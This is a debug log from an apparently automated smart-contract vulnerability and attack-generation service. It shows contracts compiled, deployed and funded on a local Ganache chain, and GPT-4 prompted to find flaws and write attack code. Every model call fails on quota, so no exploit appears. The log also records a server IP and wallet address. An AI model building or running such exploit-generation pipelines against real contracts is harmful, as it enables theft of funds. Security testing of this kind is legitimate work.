2025-07-06 13:31:14,936 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:31:14,948 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:31:14,956 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:31:14,974 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-06 13:31:15,299 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:31:15,302 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:31:15,303 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:31:15,305 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-07 17:39:14,911 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-07 17:39:15,053 - app - INFO - Application started
2025-07-07 17:39:39,435 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-07 17:39:39,525 - app - INFO - Application started
2025-07-07 17:40:04,284 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-07 17:40:04,285 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-07 17:40:04,286 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-07 17:40:04,286 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-07 17:40:04,301 - api.auth - INFO - Received login request with method: POST
2025-07-07 17:40:04,301 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '84', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-07 17:40:04,301 - api.auth - INFO - Request content type: application/json
2025-07-07 17:40:04,301 - api.auth - INFO - Processing JSON request
2025-07-07 17:40:04,301 - api.auth - INFO - Attempting to authenticate user with wallet: 0x201B9f2C14715Df60C9482B5457d05B67031F871
2025-07-07 17:40:04,555 - api.auth - INFO - Authentication successful for wallet: 0x201B9f2C14715Df60C9482B5457d05B67031F871
2025-07-07 17:40:04,556 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-07 17:40:04,557 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-07 17:40:04,558 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-07 17:40:04,558 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-07 17:40:19,355 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-07 17:40:19,355 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-07 17:40:19,355 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-07 17:40:19,355 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-07 17:40:19,367 - api.contract - INFO - Received analyze request from wallet: 0x201B9f2C14715Df60C9482B5457d05B67031F871
2025-07-07 17:40:19,373 - api.contract - INFO - Analyzing code snippet
2025-07-07 17:40:19,381 - api.contract - INFO - Starting contract analysis for user: 4
2025-07-07 17:40:19,382 - services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp15ldxvhh.sol
2025-07-07 17:40:19,383 - services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-07 17:40:19,383 - services.contract_service - INFO - Compiling contract...
2025-07-07 17:40:19,655 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.4.17+commit.bdeb9e52
2025-07-07 17:40:20,046 - solcx - INFO - solc 0.4.17 successfully installed at: /root/.solcx/solc-v0.4.17
2025-07-07 17:40:20,047 - solcx - INFO - Using solc version 0.4.17
2025-07-07 17:40:22,001 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:22,002 - openai._base_client - INFO - Retrying request to /chat/completions in 0.461692 seconds
2025-07-07 17:40:28,308 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:28,309 - openai._base_client - INFO - Retrying request to /chat/completions in 0.938224 seconds
2025-07-07 17:40:29,896 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:30,177 - services.contract_service - INFO - Compilation result: 4 contracts compiled
2025-07-07 17:40:30,177 - services.contract_service - INFO - Deploying 4 contracts...
2025-07-07 17:40:30,296 - services.contract_service - INFO - Contract Ownable deployed at 0xC89Ce4735882C9F0f0FE26686c53074E09B0D550
2025-07-07 17:40:30,296 - services.contract_service - INFO - Setting up contract Ownable...
2025-07-07 17:40:30,338 - services.contract_service - INFO - Contract Ownable setup completed
2025-07-07 17:40:30,339 - services.contract_service - INFO - Funding contract Ownable for attack testing...
2025-07-07 17:40:30,387 - services.contract_service - INFO - Contract Ownable funded
2025-07-07 17:40:30,514 - services.contract_service - INFO - Contract Pausable deployed at 0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb
2025-07-07 17:40:30,514 - services.contract_service - INFO - Setting up contract Pausable...
2025-07-07 17:40:30,574 - services.contract_service - INFO - Contract Pausable setup completed
2025-07-07 17:40:30,574 - services.contract_service - INFO - Funding contract Pausable for attack testing...
2025-07-07 17:40:30,625 - services.contract_service - INFO - Contract Pausable funded
2025-07-07 17:40:30,738 - services.contract_service - INFO - Contract SafeMath deployed at 0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7
2025-07-07 17:40:30,738 - services.contract_service - INFO - Setting up contract SafeMath...
2025-07-07 17:40:30,750 - services.contract_service - INFO - Contract SafeMath setup completed
2025-07-07 17:40:30,750 - services.contract_service - INFO - Funding contract SafeMath for attack testing...
2025-07-07 17:40:30,792 - services.contract_service - INFO - Contract SafeMath funded
2025-07-07 17:40:30,978 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:30,978 - openai._base_client - INFO - Retrying request to /chat/completions in 0.433722 seconds
2025-07-07 17:40:31,598 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:31,599 - openai._base_client - INFO - Retrying request to /chat/completions in 0.844374 seconds
2025-07-07 17:40:33,405 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:33,615 - services.contract_service - INFO - Contract TetherToken deployed at 0xe982E462b094850F12AF94d21D470e21bE9D0E9C
2025-07-07 17:40:33,616 - services.contract_service - INFO - Setting up contract TetherToken...
2025-07-07 17:40:34,648 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:34,648 - openai._base_client - INFO - Retrying request to /chat/completions in 0.484686 seconds
2025-07-07 17:40:35,274 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:35,275 - openai._base_client - INFO - Retrying request to /chat/completions in 0.820896 seconds
2025-07-07 17:40:36,615 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:36,915 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:36,915 - openai._base_client - INFO - Retrying request to /chat/completions in 0.465581 seconds
2025-07-07 17:40:37,692 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:37,692 - openai._base_client - INFO - Retrying request to /chat/completions in 0.854325 seconds
2025-07-07 17:40:39,139 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:46,287 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:46,288 - openai._base_client - INFO - Retrying request to /chat/completions in 0.434975 seconds
2025-07-07 17:40:46,877 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:46,878 - openai._base_client - INFO - Retrying request to /chat/completions in 0.777007 seconds
2025-07-07 17:40:47,837 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:47,963 - services.contract_service - INFO - Contract TetherToken setup completed
2025-07-07 17:40:47,963 - services.contract_service - INFO - Funding contract TetherToken for attack testing...
2025-07-07 17:40:48,014 - services.contract_service - INFO - Contract TetherToken funded
2025-07-07 17:40:48,015 - services.contract_service - INFO - Building contract observation...
2025-07-07 17:40:48,825 - services.contract_service - INFO - Contract observation built successfully
2025-07-07 17:40:48,825 - services.contract_service - INFO - Generating attack strategy...
2025-07-07 17:40:48,826 - services.contract_service - INFO - Running Slither analysis...
2025-07-07 17:40:49,726 - services.contract_service - WARNING - Failed to run Slither analysis: [Errno 2] No such file or directory: 'slither'
2025-07-07 17:40:49,730 - services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/services/contract_service.py", line 208, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 83, in run_slither
    result_json = subprocess.run(cmd_json)
                  ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'slither'

2025-07-07 17:40:49,730 - modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-07 17:40:49,731 - modules.attack_generator - INFO - Contract name: Ownable
2025-07-07 17:40:49,731 - modules.attack_generator - INFO - Using step number: 0 for model selection
2025-07-07 17:40:49,731 - modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-07 17:40:49,734 - modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-07 17:40:49,734 - modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-07 17:40:49,734 - modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-07 17:40:49,932 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:49,933 - openai._base_client - INFO - Retrying request to /chat/completions in 0.406603 seconds
2025-07-07 17:40:50,504 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:50,504 - openai._base_client - INFO - Retrying request to /chat/completions in 0.869512 seconds
2025-07-07 17:40:51,575 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:51,575 - modules.attack_generator - ERROR - Error querying GPT-4: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
Traceback (most recent call last):
  File "/app/modules/attack_generator.py", line 254, in query_gpt4
    response = openai.chat.completions.create(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_utils/_utils.py", line 287, in wrapper
    return func(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/resources/chat/completions/completions.py", line 1087, in create
    return self._post(
           ^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_base_client.py", line 1249, in post
    return cast(ResponseT, self.request(cast_to, opts, stream=stream, stream_cls=stream_cls))
                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_base_client.py", line 1037, in request
    raise self._make_status_error_from_response(err.response) from None
openai.RateLimitError: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
2025-07-07 17:40:51,582 - modules.attack_generator - INFO - Error querying GPT-4: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
2025-07-07 17:40:51,583 - modules.attack_generator - INFO - Contract analysis completed in 1.85 seconds
2025-07-07 17:40:51,583 - modules.attack_generator - INFO - No vulnerabilities found in the contract
2025-07-07 17:40:51,583 - modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-07 17:40:51,583 - modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-07 17:40:51,583 - modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-07 17:40:51,584 - modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-07 17:40:51,745 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:51,745 - openai._base_client - INFO - Retrying request to /chat/completions in 0.473122 seconds
2025-07-07 17:40:52,367 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:52,368 - openai._base_client - INFO - Retrying request to /chat/completions in 0.763274 seconds
2025-07-07 17:40:53,283 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-07 17:40:53,284 - modules.attack_generator - ERROR - Error querying GPT-4: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
Traceback (most recent call last):
  File "/app/modules/attack_generator.py", line 254, in query_gpt4
    response = openai.chat.completions.create(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_utils/_utils.py", line 287, in wrapper
    return func(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/resources/chat/completions/completions.py", line 1087, in create
    return self._post(
           ^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_base_client.py", line 1249, in post
    return cast(ResponseT, self.request(cast_to, opts, stream=stream, stream_cls=stream_cls))
                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_base_client.py", line 1037, in request
    raise self._make_status_error_from_response(err.response) from None
openai.RateLimitError: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
2025-07-07 17:40:53,286 - modules.attack_generator - INFO - Error querying GPT-4: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
2025-07-07 17:40:53,288 - modules.attack_generator - INFO - Attack code generation completed in 1.70 seconds
2025-07-07 17:40:53,288 - modules.attack_generator - INFO - No attack code was generated
2025-07-07 17:40:53,288 - modules.attack_generator - INFO - Total attack strategy generation completed in 3.55 seconds
2025-07-07 17:40:53,288 - modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-07 17:40:53,291 - services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp15ldxvhh.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99872199180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, 